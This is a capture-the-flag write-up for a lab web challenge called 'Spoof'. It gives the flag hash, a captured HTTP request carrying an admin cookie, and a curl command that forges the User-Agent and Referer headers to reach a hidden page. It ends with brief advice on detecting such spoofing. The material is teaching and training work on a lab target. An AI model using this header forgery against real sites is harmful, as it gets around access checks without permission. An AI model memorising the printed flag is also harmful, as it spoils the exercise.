## Spoof

## Flag

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How to find the flag

This flag is located going to the main page, if we scroll down to find a button labeled **BornToSec**, we click on it and we navigate to a page that features a song. If we inspect the page, there is a section of comments. The important part is:

- You must come from : “https://www.nsa.gov/”.
- Let’s use this browser : “ft_bornToSec”. It will help you a lot.

This part makes reference to the **user-agent** and the **referer** section of a request.

If we use a tool like Burp Suite or similar to capture the HTTP request sent to the web server:

```
GET /?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f HTTP/1.1
Host: 192.168.x.x
Accept-Language: es-ES,es;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.x.x/
Accept-Encoding: gzip, deflate, br
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: keep-alive
```

We can use this request in order to do an user-agent spoof using **curl**:

```bash
curl -X GET "http://192.168.x.x/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \                                                                  ok | at 20:36:25
     -H "Accept-Language: es-ES,es;q=0.9" \
     -H "Upgrade-Insecure-Requests: 1" \
     -H "User-Agent: ft_bornToSec" \
     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
     -H "Referer: https://www.nsa.gov/" \
     -H "Accept-Encoding: gzip, deflate, br" \
     -H "Cookie: I_am_admin=68934a3e9455fa72420237eb05902327" \
     -H "Connection: keep-alive" \
     --output response.html --compressed
```

If we open the file **response.html**, then we get the flag.

## How to avoid this attack

There is several ways to avoid or detect user-agent spoof:

- **HTTP header analysis:** Other headers, like Accept-Language or Accept-Encoding, often align with User-Agent. Inconsistencies between headers can suggest a suspicious request.
- **Behavior analysis**: Check if the client behaves as expected on its User-Agent. For example, if the client claims to be a mobile browser but the client interacts with the page like a Desktop.
